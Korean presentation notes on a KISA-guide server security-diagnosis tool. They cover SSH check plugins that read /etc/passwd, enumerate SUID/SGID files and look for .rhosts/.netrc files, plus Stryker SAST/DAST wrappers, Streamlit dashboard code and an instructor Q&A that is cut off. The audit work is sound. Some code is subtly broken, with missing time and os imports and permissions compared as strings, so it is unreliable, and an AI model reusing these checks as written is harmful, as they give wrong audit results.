| **파일 권한 점검** | 13개 | 핵심 파일의 권한(chmod) 및 소유자(chown) 확인 |
| **위험 파일 탐색** | 5개 | SUID/SGID 파일 등 위험 파일 검색 |
| **네트워크 설정** | 3개 | hosts 파일, 방화벽 규칙 등 확인 |
| **서비스 점검** | 12개 | 불필요한 서비스 활성화 여부 |
| **버전 점검** | 12개 | 설치된 소프트웨어 버전 확인 |
| **로그 설정** | 4개 | 로그 저장 및 로테이션 설정 확인 |

### 진단 방식별 상세 설명

#### 1. 인증 세션 정책 진단 (설정 파일 비교)

**발표 내용**:
> "**인증 세션 정책 진단** 부분입니다. **sshd_config, /etc/profile 등의 설정 파일을 조회하여서**
> **KISA 가이드와 비교하는 방식**을 따릅니다. **U-30번 등 총 9개의 플러그인이 이 알고리즘으로 동작**합니다."

**U-30 플러그인 예시**:
> "세부적인 구현상 **U-30을 대표로 보면**, **KISA 가이드에서 명시한 설정 파일을 읽어**
> **권고 설정과 비교하는 방식**으로 구현된 것을 볼 수 있습니다."

```python
# plugins/remote/u30_session_timeout/main.py
from core.base_plugin import BasePlugin, Finding

class U30Plugin(BasePlugin):
    """U-30: 세션 타임아웃 설정"""

    def check(self, target: dict, config: dict) -> Finding:
        ssh = self._connect_ssh(target)

        try:
            # /etc/profile 또는 /etc/bash.bashrc 확인
            command = """
                grep -E "^TMOUT=" /etc/profile /etc/bash.bashrc 2>/dev/null || echo "Not configured"
            """
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode('utf-8').strip()

            # 결과 판단
            if "Not configured" in output:
                status = '취약'
                evidence = '세션 타임아웃이 설정되지 않았습니다.'
            else:
                # TMOUT 값 추출
                import re
                match = re.search(r'TMOUT=(\d+)', output)
                if match:
                    timeout = int(match.group(1))
                    if timeout <= 600:  # 10분 이하 권장
                        status = '양호'
                        evidence = f'세션 타임아웃: {timeout}초'
                    else:
                        status = '취약'
                        evidence = f'세션 타임아웃이 너무 깁니다: {timeout}초 (권장: 600초 이하)'
                else:
                    status = '검토필요'
                    evidence = output

            return Finding(
                plugin_id='U-30',
                title='세션 타임아웃 설정',
                status=status,
                severity='중',
                category='인증 및 세션 관리',
                evidence=evidence,
                solution='''
/etc/profile 또는 /etc/bash.bashrc에 다음 추가:
export TMOUT=600
readonly TMOUT
                '''.strip()
            )

        finally:
            ssh.close()
```

#### 2. 계정 ID 무결성 점검

**발표 내용**:
> "**계정 ID 무결성 점검** 부분입니다. **계정 정보 파일을 읽어서 권고값과 비교하는 방식**을 사용합니다.
> **U-05번부터 총 9개의 항목**이 해당 진단 방식을 따릅니다.
> **대표적으로 U-05번으로 살펴보면**, **/etc/passwd 파일을 읽어 UID 값을 추출하고 권고값과 비교**합니다."

```python
# plugins/remote/u05_duplicate_uid/main.py
from core.base_plugin import BasePlugin, Finding
from collections import Counter

class U05Plugin(BasePlugin):
    """U-05: 중복 UID 존재 여부"""

    def check(self, target: dict, config: dict) -> Finding:
        ssh = self._connect_ssh(target)

        try:
            # /etc/passwd에서 UID 추출
            command = "awk -F: '{print $3}' /etc/passwd"
            stdin, stdout, stderr = ssh.exec_command(command)
            uids = stdout.read().decode('utf-8').strip().split('\n')

            # 중복 UID 검사
            uid_counts = Counter(uids)
            duplicates = {uid: count for uid, count in uid_counts.items() if count > 1}

            if duplicates:
                status = '취약'
                evidence = f'중복 UID 발견: {duplicates}'
            else:
                status = '양호'
                evidence = '중복 UID가 없습니다.'

            return Finding(
                plugin_id='U-05',
                title='중복 UID 확인',
                status=status,
                severity='중',
                category='계정 관리',
                evidence=evidence,
                solution='''
중복 UID를 가진 계정을 확인하고 고유한 UID로 변경:
sudo usermod -u <새로운_UID> <사용자명>
                '''.strip()
            )

        finally:
            ssh.close()
```

---

계속해서 Stryker AI 연동, 대시보드, 질의응답 등을 작성하겠습니다.
#### 3. 핵심 설정 파일 권한 점검

**발표 내용**:
> "다음으로 **핵심 설정 파일 권한 점검** 부분입니다. **U-16 등 13개의 항목**이 해당 방식을 따릅니다.
> **U-16을 대표로 살펴보면**, **/etc/passwd 파일의 권한과 소유자를 읽어 KISA 권고값과 비교**합니다."

```python
# plugins/remote/u16_passwd_file_permission/main.py
from core.base_plugin import BasePlugin, Finding
import stat

class U16Plugin(BasePlugin):
    """U-16: /etc/passwd 파일 권한 설정"""

    def check(self, target: dict, config: dict) -> Finding:
        ssh = self._connect_ssh(target)

        try:
            # 파일 권한 및 소유자 확인
            command = "stat -c '%a %U %G' /etc/passwd"
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode('utf-8').strip()

            # 결과 파싱
            permission, owner, group = output.split()

            # 권고사항: 644 또는 그 이하, root 소유
            if permission <= '644' and owner == 'root' and group == 'root':
                status = '양호'
                evidence = f'/etc/passwd 권한: {permission}, 소유자: {owner}:{group}'
            else:
                status = '취약'
                evidence = f'/etc/passwd 권한: {permission}, 소유자: {owner}:{group} (권장: 644, root:root)'

            return Finding(
                plugin_id='U-16',
                title='/etc/passwd 파일 권한 설정',
                status=status,
                severity='상',
                category='파일 및 디렉토리 관리',
                evidence=evidence,
                solution='''
sudo chmod 644 /etc/passwd
sudo chown root:root /etc/passwd
                '''.strip()
            )

        finally:
            ssh.close()
```

#### 4. SUID/SGID 파일 점검 (위험 파일 탐색)

**발표 내용**:
> "**시스템 전역에서 SUID, SGID가 설정된 파일을 검색하여 화이트리스트와 비교하는 방식**으로 진단을 수행합니다."

```python
# plugins/remote/u23_suid_sgid_files/main.py
from core.base_plugin import BasePlugin, Finding

class U23Plugin(BasePlugin):
    """U-23: SUID, SGID 설정 파일 점검"""

    # 일반적으로 안전한 SUID/SGID 파일 화이트리스트
    WHITELIST = [
        '/usr/bin/sudo',
        '/usr/bin/su',
        '/usr/bin/passwd',
        '/usr/bin/chsh',
        '/usr/bin/chfn',
        '/usr/bin/gpasswd',
        '/usr/bin/newgrp',
        '/bin/mount',
        '/bin/umount',
        '/bin/ping',
    ]

    def check(self, target: dict, config: dict) -> Finding:
        ssh = self._connect_ssh(target)

        try:
            # SUID/SGID 파일 검색
            command = """
                find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null
            """
            stdin, stdout, stderr = ssh.exec_command(command, timeout=60)
            output = stdout.read().decode('utf-8').strip()

            # 파일 목록
            suid_files = [f for f in output.split('\n') if f]

            # 화이트리스트에 없는 파일 찾기
            suspicious = [f for f in suid_files if f not in self.WHITELIST]

            if suspicious:
                status = '취약'
                evidence = f'화이트리스트에 없는 SUID/SGID 파일 발견:\n' + '\n'.join(suspicious[:10])
                if len(suspicious) > 10:
                    evidence += f'\n... 외 {len(suspicious) - 10}개'
            else:
                status = '양호'
                evidence = f'모든 SUID/SGID 파일이 화이트리스트에 포함됨 (총 {len(suid_files)}개)'

            return Finding(
                plugin_id='U-23',
                title='SUID/SGID 설정 파일 점검',
                status=status,
                severity='상',
                category='파일 및 디렉토리 관리',
                evidence=evidence,
                solution='''
불필요한 SUID/SGID 제거:
sudo chmod u-s <파일경로>
sudo chmod g-s <파일경로>
                '''.strip()
            )

        finally:
            ssh.close()
```

#### 5. 네트워크 접근제어 점검

**발표 내용**:
> "**네트워크 접근제어 점검** 부분입니다. **U-27 등 3개의 항목**이 해당 진단 방식을 따릅니다.
> **U-27 플러그인을 대표로 살펴보면**, **사용자 홈 디렉토리를 순회하여 위험 파일 권한을 확인**합니다."

```python
# plugins/remote/u27_user_home_permission/main.py
from core.base_plugin import BasePlugin, Finding

class U27Plugin(BasePlugin):
    """U-27: 사용자 홈 디렉토리 권한 설정"""

    DANGEROUS_FILES = ['.rhosts', '.netrc', 'hosts.equiv']

    def check(self, target: dict, config: dict) -> Finding:
        ssh = self._connect_ssh(target)

        try:
            # 모든 사용자 홈 디렉토리 확인
            command = """
                for home in $(awk -F: '$3 >= 1000 && $7 !~ /nologin|false/ {print $6}' /etc/passwd); do
                    for file in .rhosts .netrc; do
                        if [ -f "$home/$file" ]; then
                            echo "$home/$file: $(stat -c '%a' "$home/$file")"
                        fi
                    done
                done
            """
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode('utf-8').strip()

            if output:
                # 위험 파일 존재
                status = '취약'
                evidence = f'위험한 파일 발견:\n{output}'
            else:
                status = '양호'
                evidence = '위험한 파일(.rhosts, .netrc)이 존재하지 않습니다.'

            return Finding(
                plugin_id='U-27',
                title='사용자 홈 디렉토리 내 위험 파일 점검',
                status=status,
                severity='상',
                category='파일 및 디렉토리 관리',
                evidence=evidence,
                solution='''
위험 파일 제거:
sudo rm -f ~/.rhosts ~/.netrc
sudo rm -f /etc/hosts.equiv
                '''.strip()
            )

        finally:
            ssh.close()
```

#### 6. 서비스 점검

**발표 내용**:
> "**서비스 점검** 부분입니다. **서비스 활성화 등을 확인하여 KISA 권고값과 비교**하는 방식으로 구현되어 있습니다.
> **U-34 플러그인을 대표로 살펴보면**, **설정 파일에서 Finger 서비스 활성 여부를 검사**하여 진단합니다."

```python
# plugins/remote/u34_finger_service/main.py
from core.base_plugin import BasePlugin, Finding

class U34Plugin(BasePlugin):
    """U-34: Finger 서비스 비활성화"""

    def check(self, target: dict, config: dict) -> Finding:
        ssh = self._connect_ssh(target)

        try:
            # Finger 서비스 확인 (xinetd 또는 systemd)
            command = """
                # xinetd 기반
                if [ -f /etc/xinetd.d/finger ]; then
                    grep -i "disable" /etc/xinetd.d/finger
                fi

                # systemd 기반
                systemctl is-enabled finger 2>/dev/null || echo "not-found"
            """
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode('utf-8').strip()

            if 'disable = yes' in output or 'not-found' in output or 'disabled' in output:
                status = '양호'
                evidence = 'Finger 서비스가 비활성화되어 있습니다.'
            else:
                status = '취약'
                evidence = f'Finger 서비스가 활성화되어 있습니다:\n{output}'

            return Finding(
                plugin_id='U-34',
                title='Finger 서비스 비활성화',
                status=status,
                severity='중',
                category='서비스 관리',
                evidence=evidence,
                solution='''
# xinetd 기반
sudo vi /etc/xinetd.d/finger
# disable = yes로 변경

# systemd 기반
sudo systemctl disable finger
sudo systemctl stop finger
                '''.strip()
            )

        finally:
            ssh.close()
```

#### 7. 서비스 설정 버전 점검

**발표 내용**:
> "**서비스 설정 버전 점검** 부분입니다. **설정 파일과 버전 정보를 종합 분석하는 방식**을 사용합니다.
> **U-45 등 12개 항목**이 해당 진단 방식을 따릅니다.
> 대표적으로 **U-45 진단 방식**입니다. **Sendmail 등 서비스 버전을 읽어 허용 버전과 비교**합니다."

```python
# plugins/remote/u45_sendmail_version/main.py
from core.base_plugin import BasePlugin, Finding
import re

class U45Plugin(BasePlugin):
    """U-45: Sendmail 버전 점검"""

    # 알려진 취약 버전 (예시)
    VULNERABLE_VERSIONS = [
        '8.12.0', '8.12.1', '8.12.2', '8.12.3',
        '8.13.0', '8.13.1',
    ]

    def check(self, target: dict, config: dict) -> Finding:
        ssh = self._connect_ssh(target)

        try:
            # Sendmail 버전 확인
            command = "sendmail -d0.1 -bv root 2>&1 | grep Version || echo 'not-installed'"
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode('utf-8').strip()

            if 'not-installed' in output:
                status = '양호'
                evidence = 'Sendmail이 설치되어 있지 않습니다.'
            else:
                # 버전 추출
                match = re.search(r'Version (\d+\.\d+\.\d+)', output)
                if match:
                    version = match.group(1)
                    if version in self.VULNERABLE_VERSIONS:
                        status = '취약'
                        evidence = f'취약한 Sendmail 버전 사용: {version}'
                    else:
                        status = '양호'
                        evidence = f'Sendmail 버전: {version} (취약 버전 아님)'
                else:
                    status = '검토필요'
                    evidence = f'버전 정보를 파싱할 수 없습니다:\n{output}'

            return Finding(
                plugin_id='U-45',
                title='Sendmail 버전 점검',
                status=status,
                severity='상',
                category='패치 관리',
                evidence=evidence,
                solution='''
최신 버전으로 업데이트:
sudo apt update
sudo apt upgrade sendmail

또는 Sendmail 대신 Postfix 사용 권장
                '''.strip()
            )

        finally:
            ssh.close()
```

---

## 🤖 2.2.9 Stryker AI 에이전트 연동

### Stryker AI란?

**발표 내용**:
> "다음으로 **다이나믹과 스태틱 진단을 수행하는 외부 도구 플러그인 파이프라인**입니다.
> **현재는 Stryker 도구만 추가**되어 있으며..."

**Stryker AI의 특징**:
- AI 기반 보안 진단 도구
- SAST (Static Application Security Testing) 지원
- DAST (Dynamic Application Security Testing) 지원
- CLI로 실행 가능
- JSON 형식의 리포트 생성

### Stryker 플러그인 파이프라인

**발표 내용**:
> "**Scan Executor가 Stryker 플러그인을 실행**시키면 **코어의 External Runner 모듈이 Stryker 도구를 CLI로 실행**시킵니다.
> **도구의 출력값을 스토리지에 기록**하며 **출력값과 결과를 파싱해서 진단 수행 현황을 대시보드에 출력**하고 **최종적으로 결과를 생성**합니다."


### Stryker SAST 플러그인

```python
# plugins/static/stryker_sast/main.py
import subprocess
import json
import os
from core.base_plugin import BasePlugin, Finding

class StrykerSASTPlugin(BasePlugin):
    """Stryker AI SAST 플러그인"""

    def check(self, target: dict, config: dict) -> Finding:
        """
        GitHub 레포지토리 정적 분석

        Args:
            target: {
                'type': 'repository',
                'url': 'https://github.com/user/repo.git'
            }
        """

        repo_url = target['url']
        output_file = f"stryker_sast_{int(time.time())}.json"

        try:
            # Stryker CLI 실행
            command = [
                'stryker',
                'scan',
                '--type', 'sast',
                '--target', repo_url,
                '--output', output_file,
                '--format', 'json'
            ]

            print(f"[Stryker SAST] 스캔 시작: {repo_url}")
            print(f"[Stryker SAST] 예상 소요 시간: 약 3-5분")

            # 실행 및 실시간 출력
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            # 실시간 로그 출력
            for line in process.stdout:
                print(f"[Stryker] {line.strip()}")

            process.wait()

            # 결과 파일 읽기
            if not os.path.exists(output_file):
                raise FileNotFoundError(f"Stryker 결과 파일을 찾을 수 없습니다: {output_file}")

            with open(output_file, 'r') as f:
                stryker_result = json.load(f)

            # 결과 파싱
            findings = self._parse_stryker_result(stryker_result)

            # 파일 저장 (나중에 참조 가능)
            storage_path = f"storage/stryker/{output_file}"
            os.makedirs(os.path.dirname(storage_path), exist_ok=True)
            os.rename(output_file, storage_path)

            # 요약 정보 생성
            total = len(findings)
            critical = sum(1 for f in findings if f['severity'] == 'Critical')
            high = sum(1 for f in findings if f['severity'] == 'High')

            status = '취약' if (critical > 0 or high > 0) else '양호'
            evidence = f'''
Stryker SAST 분석 완료
- 총 발견 항목: {total}개
- Critical: {critical}개
- High: {high}개
- 상세 리포트: {storage_path}
            '''.strip()

            return Finding(
                plugin_id='STRYKER-SAST',
                title='Stryker AI 정적 분석',
                status=status,
                severity='상' if (critical > 0) else '중' if (high > 0) else '하',
                category='소스 코드 분석',
                evidence=evidence,
                solution='발견된 취약점에 대한 상세 조치 방법은 Stryker 리포트 참조',
                references=[{
                    'name': 'Stryker Report',
                    'url': storage_path
                }]
            )

        except Exception as e:
            return Finding(
                plugin_id='STRYKER-SAST',
                title='Stryker AI 정적 분석',
                status='에러',
                severity='중',
                category='소스 코드 분석',
                evidence=f'Stryker 실행 중 오류 발생: {str(e)}',
                solution=None
            )

    def _parse_stryker_result(self, stryker_result: dict) -> list:
        """Stryker 결과를 표준 Finding 형식으로 변환"""
        findings = []

        for vuln in stryker_result.get('vulnerabilities', []):
            findings.append({
                'type': vuln.get('type'),
                'severity': vuln.get('severity'),
                'file': vuln.get('location', {}).get('file'),
                'line': vuln.get('location', {}).get('line'),
                'description': vuln.get('description'),
                'recommendation': vuln.get('recommendation')
            })

        return findings
```

### Stryker DAST 플러그인

```python
# plugins/dynamic/stryker_dast/main.py
from core.base_plugin import BasePlugin, Finding
import subprocess
import json

class StrykerDASTPlugin(BasePlugin):
    """Stryker AI DAST 플러그인"""

    def check(self, target: dict, config: dict) -> Finding:
        """
        웹 애플리케이션 동적 분석

        Args:
            target: {
                'type': 'web',
                'url': 'http://example.com'
            }
        """

        web_url = target['url']
        output_file = f"stryker_dast_{int(time.time())}.json"

        try:
            # Stryker CLI 실행
            command = [
                'stryker',
                'scan',
                '--type', 'dast',
                '--target', web_url,
                '--output', output_file,
                '--format', 'json',
                '--depth', '3',  # 크롤링 깊이
                '--timeout', '300'  # 5분 타임아웃
            ]

            print(f"[Stryker DAST] 스캔 시작: {web_url}")
            print(f"[Stryker DAST] 예상 소요 시간: 약 5-10분")

            # 실행
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            # 실시간 로그
            for line in process.stdout:
                print(f"[Stryker] {line.strip()}")

            process.wait()

            # 결과 읽기 및 파싱
            with open(output_file, 'r') as f:
                stryker_result = json.load(f)

            findings = self._parse_stryker_result(stryker_result)

            # 저장
            storage_path = f"storage/stryker/{output_file}"
            os.makedirs(os.path.dirname(storage_path), exist_ok=True)
            os.rename(output_file, storage_path)

            # 요약
            total = len(findings)
            xss = sum(1 for f in findings if 'XSS' in f['type'])
            sqli = sum(1 for f in findings if 'SQL' in f['type'])

            status = '취약' if total > 0 else '양호'
            evidence = f'''
Stryker DAST 분석 완료
- 총 발견 항목: {total}개
- XSS: {xss}개
- SQL Injection: {sqli}개
- 상세 리포트: {storage_path}
            '''.strip()

            return Finding(
                plugin_id='STRYKER-DAST',
                title='Stryker AI 동적 분석',
                status=status,
                severity='상' if total > 5 else '중' if total > 0 else '하',
                category='웹 애플리케이션 분석',
                evidence=evidence,
                solution='발견된 취약점에 대한 상세 조치 방법은 Stryker 리포트 참조',
                references=[{
                    'name': 'Stryker Report',
                    'url': storage_path
                }]
            )

        except Exception as e:
            return Finding(
                plugin_id='STRYKER-DAST',
                title='Stryker AI 동적 분석',
                status='에러',
                severity='중',
                category='웹 애플리케이션 분석',
                evidence=f'Stryker 실행 중 오류 발생: {str(e)}',
                solution=None
            )
```

### Stryker 비용 문제

**질문** (강사):
> "쭉 보다 보면 자동진단 스크립트나 다른 친구들은 Stryker의 에이전트나 오픈소스를 활용한 게 아니라 **자체적으로 최대한 자기들이 다 구현**을 했거든요.
> 근데 여기에서는 Stryker가 자동진단 구현하다 쭉 나오다가 페이지 딱 넘어가면서 Stryker 설명이 설명으로 바뀌어요.
> 거기에 대한 어떤 **연관 관계에 대한 설명도 없었**거든요."

**답변** (팀원):
> "오늘 좀 자세하게 설명드리면 **원격 진단, 리모트 진단 부분은 순수히 모두 저희 스크립트로만 구현**을 했고요.
> 이렇게 **하나하나 67개 플러그인을 싹 다 구현**을 해가지고 구현을 했는데
> **시간 관계상 동적 진단과 정적 진단이 실제 범용적으로 만들기에 부족**하다고 느껴서
> **전부 다 할 수 있는 도구를 그냥 빠르게 넣는 과정에서 Stryker를 넣게** 되어서 간단하게 좀 따로 넣는 느낌이 났던 것 같습니다."

**Stryker 비용**:
> "어제 테스트를 해봤는데 **대충 한 2~3번 돌릴 때 5달러 정도**가 나와서 **약 30분 정도 걸립니다**.
> 그래가지고 **시연은 따로 못했습니다**. **어제 돌려놓은 결과로 제가 리포트만 보여드리는 방식**으로 진행했습니다."

---

## 📊 2.2.10 Streamlit 대시보드

### 대시보드 구성

**발표 내용**:
> "다음으로 **진단 도구 대시보드 구성과 결과**를 간략하게 보여드리겠습니다."

**대시보드 페이지 구성**:
1. 홈 대시보드 (통계 요약)
2. 진단 타겟 관리
3. 진단 작업 관리
4. 진단 결과 조회
5. 리포트 생성

### 1. 진단 타겟 관리

**발표 내용**:
> "**진단 타겟 관리 대시보드**입니다. **서버, 웹, 리포지토리 세 가지 유형**으로 나누어
> **각 URL, IP 등 대상 정보와 필요한 경우 인증서 등의 Credential 정보를 담아서 타겟을 등록**할 수 있습니다."

```python
# dashboard/pages/1_Target_Management.py
import streamlit as st
import requests

st.title("🎯 진단 타겟 관리")

# 타겟 유형 선택
target_type = st.selectbox(
    "타겟 유형",
    ["서버 (Server)", "웹 (Web)", "리포지토리 (Repository)"]
)

# 서버 타겟 등록
if target_type == "서버 (Server)":
    with st.form("server_target"):
        st.subheader("서버 타겟 등록")

        name = st.text_input("서버 이름", placeholder="예: web-server-01")
        ip = st.text_input("IP 주소", placeholder="예: 52.79.xxx.xxx")
        port = st.number_input("SSH 포트", value=22, min_value=1, max_value=65535)
        username = st.text_input("사용자명", placeholder="예: ubuntu")
        key_file = st.file_uploader("SSH 키 파일 (.pem)", type=['pem', 'key'])

        # Jump Proxy 설정 (선택)
        use_jump = st.checkbox("Jump Proxy 사용")
        if use_jump:
            jump_ip = st.text_input("Jump Server IP")
            jump_port = st.number_input("Jump Server Port", value=22)
            jump_username = st.text_input("Jump Server 사용자명")
            jump_key = st.file_uploader("Jump Server SSH 키", type=['pem', 'key'])

        submitted = st.form_submit_button("등록")

        if submitted:
            # API 호출
            data = {
                "type": "server",
                "name": name,
                "ip": ip,
                "port": port,
                "username": username,
                "key_content": key_file.getvalue().decode() if key_file else None
            }

            if use_jump:
                data["jump_proxy"] = {
                    "ip": jump_ip,
                    "port": jump_port,
                    "username": jump_username,
                    "key_content": jump_key.getvalue().decode() if jump_key else None
                }

            response = requests.post("http://localhost:8000/api/targets", json=data)

            if response.status_code == 200:
                st.success(f"타겟 '{name}'이 등록되었습니다!")
            else:
                st.error(f"등록 실패: {response.json()}")

# 등록된 타겟 목록
st.subheader("등록된 타겟 목록")

response = requests.get("http://localhost:8000/api/targets")
if response.status_code == 200:
    targets = response.json()

    if targets:
        for target in targets:
            with st.expander(f"[{target['type']}] {target['name']}"):
                st.write(f"**ID**: {target['id']}")
                st.write(f"**IP**: {target.get('ip', 'N/A')}")
                st.write(f"**URL**: {target.get('url', 'N/A')}")
                st.write(f"**등록일**: {target['created_at']}")

                # SSH 연결 테스트 (서버 타겟인 경우)
                if target['type'] == 'server':
                    if st.button(f"SSH 연결 테스트", key=f"test_{target['id']}"):
                        test_response = requests.post(
                            f"http://localhost:8000/api/targets/{target['id']}/test"
                        )

                        if test_response.status_code == 200:
                            st.success("✅ SSH 연결 성공!")
                        else:
                            st.error(f"❌ SSH 연결 실패: {test_response.json()}")

                # 삭제 버튼
                if st.button(f"삭제", key=f"delete_{target['id']}"):
                    delete_response = requests.delete(
                        f"http://localhost:8000/api/targets/{target['id']}"
                    )

                    if delete_response.status_code == 200:
                        st.success("삭제되었습니다!")
                        st.experimental_rerun()
    else:
        st.info("등록된 타겟이 없습니다.")
```

**시연 내용**:
> "**서버인 경우 등록한 이후에 SSH 연결이 정상적으로 진행되는지 검사가 가능**하고
> **기본적으로 타겟에 대한 조회 삭제 기능이 구현**되어 있습니다."

### 2. 진단 작업 관리

**발표 내용**:
> "**진단 작업 관리**입니다. **특정 타겟을 대상으로 원하는 플러그인들을 선택하여 진단 작업을 만들고**
> **각 플러그인들에 대한 세부 설정을 오버라이드** 할 수 있습니다."

```python
# dashboard/pages/2_Scan_Jobs.py
import streamlit as st
import requests

st.title("🔍 진단 작업 관리")

# 진단 작업 생성
with st.form("create_scan_job"):
    st.subheader("새 진단 작업 생성")

    # 타겟 선택
    targets_response = requests.get("http://localhost:8000/api/targets")
    targets = targets_response.json()
    target_options = {f"[{t['type']}] {t['name']}": t['id'] for t in targets}
    selected_target = st.selectbox("진단 타겟", options=list(target_options.keys()))

    # 채널 선택
    channel = st.selectbox(
        "진단 채널",
        ["remote (원격 서버)", "static (정적 분석)", "dynamic (동적 분석)"]
    )
    channel_value = channel.split()[0]

    # 플러그인 선택
    if channel_value == "remote":
        plugins_response = requests.get("http://localhost:8000/api/plugins/remote")
        plugins = plugins_response.json()

        st.write("**플러그인 선택** (67개 중 선택)")

        # 전체 선택 옵션
        select_all = st.checkbox("전체 선택")

        if select_all:
            selected_plugins = [p['id'] for p in plugins]
        else:
            # 카테고리별로 그룹화
            categories = {}
            for p in plugins:
                cat = p['category']
                if cat not in categories:
                    categories[cat] = []
                categories[cat].append(p)

            selected_plugins = []
            for cat, cat_plugins in categories.items():
                with st.expander(f"{cat} ({len(cat_plugins)}개)"):
                    for p in cat_plugins:
                        if st.checkbox(f"{p['id']} - {p['name']}", key=p['id']):
                            selected_plugins.append(p['id'])

    # OS 설정
    os_type = st.selectbox("OS 유형", ["ubuntu", "centos", "redhat"])

    # Sudo 사용 여부
    use_sudo = st.checkbox("Sudo 권한 사용", value=True)

    # 작업 생성
    submitted = st.form_submit_button("진단 시작")

    if submitted:
        job_data = {
            "target_id": target_options[selected_target],
            "channel": channel_value,
            "plugins": selected_plugins if not select_all else None,  # None = 전체
            "config": {
                "os": os_type,
                "use_sudo": use_sudo
            }
        }

        response = requests.post("http://localhost:8000/api/scans", json=job_data)

        if response.status_code == 200:
            job = response.json()
            st.success(f"✅ 진단 작업 #{job['id']} 시작!")
            st.info(f"진단 중... 예상 소요 시간: {len(selected_plugins) * 2}초")

            # 실시간 진행 상황 (WebSocket or SSE로 구현 가능)
            progress_bar = st.progress(0)
            status_text = st.empty()

            # 진행 상황 폴링
            import time
            for i in range(100):
                time.sleep(0.5)
                progress = requests.get(f"http://localhost:8000/api/scans/{job['id']}/progress")
                if progress.status_code == 200:
                    data = progress.json()
                    progress_bar.progress(data['percent'] / 100)
                    status_text.text(f"{data['current_plugin']} 진단 중...")

                    if data['status'] == 'completed':
                        st.success("✅ 진단 완료!")
                        break
        else:
            st.error(f"❌ 진단 시작 실패: {response.json()}")
```

### 3. 진단 결과 관리

**발표 내용**:
> "**진단 결과 관리**입니다. **진단 중 생성한 Findings를 관리**하며 **조회 삭제**들이 가능합니다."

```python
# dashboard/pages/3_Findings.py
import streamlit as st
import requests
import pandas as pd

st.title("📋 진단 결과 (Findings)")

# 필터
col1, col2, col3 = st.columns(3)

with col1:
    status_filter = st.multiselect(
        "상태",
        ["양호", "취약", "검토필요", "에러"],
        default=["취약"]
    )

with col2:
    severity_filter = st.multiselect(
        "심각도",
        ["상", "중", "하"],
        default=["상", "중"]
    )

with col3:
    category_filter = st.selectbox(
        "카테고리",
        ["전체", "계정관리", "파일 및 디렉토리 관리", "서비스 관리", "패치 관리"]
    )

# Findings 조회
params = {
    "status": status_filter,
    "severity": severity_filter
}

if category_filter != "전체":
    params["category"] = category_filter

response = requests.get("http://localhost:8000/api/findings", params=params)

if response.status_code == 200:
    findings = response.json()

    if findings:
        # 통계
        st.subheader("📊 통계")
        col1, col2, col3, col4 = st.columns(4)

        total = len(findings)
        vulnerable = sum(1 for f in findings if f['status'] == '취약')
        critical = sum(1 for f in findings if f['severity'] == '상')

        col1.metric("전체", total)
        col2.metric("취약", vulnerable)
        col3.metric("Critical", critical)
        col4.metric("취약률", f"{vulnerable/total*100:.1f}%")

        # 테이블
        st.subheader("🔍 상세 결과")

        df = pd.DataFrame(findings)
        st.dataframe(
            df[['plugin_id', 'title', 'status', 'severity', 'category']],
            use_container_width=True
        )

        # 상세 보기
        for finding in findings:
            status_emoji = {
                '양호': '✅',
                '취약': '❌',
                '검토필요': '⚠️',
                '에러': '🔴'
            }

            with st.expander(
                f"{status_emoji.get(finding['status'], '❓')} "
                f"{finding['plugin_id']} - {finding['title']} "
                f"[{finding['severity']}]"
            ):
                st.write(f"**상태**: {finding['status']}")
                st.write(f"**심각도**: {finding['severity']}")
                st.write(f"**카테고리**: {finding['category']}")

                if finding.get('evidence'):
                    st.write("**증적**:")
                    st.code(finding['evidence'])

                if finding.get('solution'):
                    st.write("**조치 방법**:")
                    st.code(finding['solution'], language='bash')

                if finding.get('references'):
                    st.write("**참고 자료**:")
                    for ref in finding['references']:
                        st.markdown(f"- [{ref['name']}]({ref['url']})")
    else:
        st.info("조건에 맞는 결과가 없습니다.")
```

### 4. 리포트 생성 및 조회

**발표 내용**:
> "**진단 리포트 관리**입니다. **수행한 만들어놓은 진단 잡을 대상으로**
> **해당 잡에서 발견한 Findings를 모아서 리포트를 생성**할 수 있으며 **조회 삭제가 가능**합니다."

```python
# dashboard/pages/4_Reports.py
import streamlit as st
import requests

st.title("📄 진단 리포트")

# 리포트 생성
with st.form("generate_report"):
    st.subheader("리포트 생성")

    # 진단 작업 선택
    jobs_response = requests.get("http://localhost:8000/api/scans")
    jobs = jobs_response.json()

    job_options = {f"Job #{j['id']} - {j['created_at']}": j['id'] for j in jobs}
    selected_job = st.selectbox("진단 작업", options=list(job_options.keys()))

    # 리포트 형식
    format = st.selectbox("리포트 형식", ["JSON", "PDF", "HTML", "Markdown"])

    submitted = st.form_submit_button("생성")

    if submitted:
        report_data = {
            "scan_id": job_options[selected_job],
            "format": format.lower()
        }

        response = requests.post("http://localhost:8000/api/reports", json=report_data)

        if response.status_code == 200:
            report = response.json()
            st.success(f"✅ 리포트 #{report['id']} 생성 완료!")

            # 다운로드 버튼
            st.download_button(
                label=f"📥 {format} 다운로드",
                data=report['content'],
                file_name=f"report_{report['id']}.{format.lower()}",
                mime=f"application/{format.lower()}"
            )

# 기존 리포트 목록
st.subheader("생성된 리포트")

response = requests.get("http://localhost:8000/api/reports")
if response.status_code == 200:
    reports = response.json()

    for report in reports:
        with st.expander(f"Report #{report['id']} - {report['created_at']}"):
            st.write(f"**Scan ID**: {report['scan_id']}")
            st.write(f"**형식**: {report['format']}")
            st.write(f"**Findings**: {report['finding_count']}개")

            if st.button(f"보기", key=f"view_{report['id']}"):
                # 리포트 내용 표시
                st.json(report['content'])
```

---

## 💬 2.2.11 질의응답 및 강사 피드백

### 질문 1: 3-Tier 아키텍처

**질문** (강사):
> "발표를 할 때 보면 **3-Tier 환경에서 구현을 했다고 했는데**
> 실제 그 구현한 상황을 보면 **2-Tier밖에 안 보였**거든요.
> **RDS를 데이터 쪽에서 썼고** 그 앞단에서 지금 **Tomcat을 쓴 건 알겠는데**,
> 아까 EC2 서버 구성한 데에서도 **Bastion 서버 아니면 웹 서버**, 이렇게 **웹 서버 뒤에 RDS 두 대만 놓고 작업**한 거 맞나요?"

**답변** (팀원):
